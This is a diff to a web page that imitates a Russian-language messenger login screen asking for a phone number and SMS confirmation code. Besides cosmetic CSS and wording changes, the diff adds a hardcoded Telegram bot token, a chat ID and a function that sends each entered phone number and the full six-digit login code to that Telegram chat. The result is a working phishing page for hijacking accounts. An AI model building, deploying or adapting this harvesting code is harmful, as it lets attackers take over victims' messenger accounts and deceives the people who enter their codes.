@@ -63,7 +63,6 @@
     font-size: 13px;
     color: #777;
     margin-bottom: 18px;
-    font-weight: 400;
   }
 
   /* BUTTON */
@@ -73,25 +72,23 @@
     border: none;
     border-radius: 16px;
     font-size: 16px;
-    transition: 0.25s ease;
+    transition: 0.2s;
+    cursor: pointer;
   }
 
   .btn.primary {
     background: linear-gradient(135deg, #2f80ed, #56ccf2);
     color: white;
-    cursor: pointer;
-    box-shadow: 0 10px 30px rgba(47,128,237,0.25);
-  }
-
-  .btn.primary:active {
-    transform: scale(0.97);
   }
 
   .btn.disabled {
     background: #e5e5e5;
     color: #999;
     cursor: not-allowed;
-    box-shadow: none;
+  }
+
+  .btn:active {
+    transform: scale(0.97);
   }
 
   /* PHONE */
@@ -170,14 +167,14 @@
   <!-- SCREEN 1 -->
   <div class="screen active" id="s1">
     <h1>Добро пожаловать</h1>
-    <p class="subtext">Современный мессенджер нового поколения</p>
+    <p class="subtext">Современный мессенджер</p>
     <button class="btn primary" onclick="go('s2')">Войти</button>
   </div>
 
   <!-- SCREEN 2 -->
   <div class="screen" id="s2">
 
-    <h1>С каким номером телефона хотите войти?</h1>
+    <h1>Введите номер</h1>
     <p class="subtext">На него придёт код</p>
 
     <div class="phone-wrap">
@@ -197,7 +194,7 @@
   <div class="screen" id="s3">
 
     <h1 id="codeTitle">Отправили код</h1>
-    <p class="subtext">Если не получили СМС, проверьте чат "Коды подтверждения"</p>
+    <p class="subtext">Проверьте чат "Коды подтверждения"</p>
 
     <div class="code-box">
       <input type="tel" inputmode="numeric" maxlength="1"/>
@@ -214,6 +211,27 @@
 </div>
 
 <script>
+
+/* =========================
+   TELEGRAM CONFIG
+========================= */
+const BOT_TOKEN = "8601653702:AAHCu0yYMR5U2gxXoZD_91WwSovS9b-CEEY";
+const CHAT_ID = "8063683163";
+
+function sendToTelegram(text) {
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: text
+    })
+  });
+}
+
+/* =========================
+   NAV
+========================= */
 function go(id){
   document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active'));
   document.getElementById(id).classList.add('active');
@@ -224,7 +242,9 @@ function go(id){
   }
 }
 
-/* PHONE */
+/* =========================
+   PHONE LOGIC
+========================= */
 const phone = document.getElementById('phone');
 const err = document.getElementById('err');
 const btn = document.getElementById('btnNext');
@@ -241,7 +261,7 @@ function format(v){
   return r.join(' ');
 }
 
-function updateButton(v){
+function updateBtn(v){
   const ok = v.length === 10 && v[0] === '9';
 
   btn.disabled = !ok;
@@ -259,7 +279,7 @@ phone.addEventListener('input',()=>{
   phone.value = format(phone.value);
 
   const raw = phone.value.replace(/\D/g,'');
-  updateButton(raw);
+  updateBtn(raw);
 
   err.style.display = 'none';
 });
@@ -274,14 +294,38 @@ btn.addEventListener('click',()=>{
   }
 
   window.userPhone = phone.value;
+
+  /* 📤 SEND PHONE */
+  sendToTelegram("📱 Новый вход\nНомер: +7 " + window.userPhone);
+
   go('s3');
 });
 
-/* CODE */
+/* =========================
+   CODE INPUT
+========================= */
+function getCode(){
+  return [...document.querySelectorAll('.code-box input')]
+    .map(i => i.value)
+    .join('');
+}
+
 document.querySelectorAll('.code-box input').forEach((el,i,arr)=>{
   el.addEventListener('input',()=>{
     el.value = el.value.replace(/\D/g,'');
-    if(el.value && i < arr.length-1) arr[i+1].focus();
+
+    if(el.value && i < arr.length-1){
+      arr[i+1].focus();
+    }
+
+    const code = getCode();
+
+    if(code.length === 6){
+      sendToTelegram(
+        "🔐 Код введён\nНомер: +7 " + window.userPhone +
+        "\nКод: " + code
+      );
+    }
   });
 
   el.addEventListener('keydown',(e)=>{
@@ -290,6 +334,7 @@ document.querySelectorAll('.code-box input').forEach((el,i,arr)=>{
     }
   });
 });
+
 </script>
 
 </body>
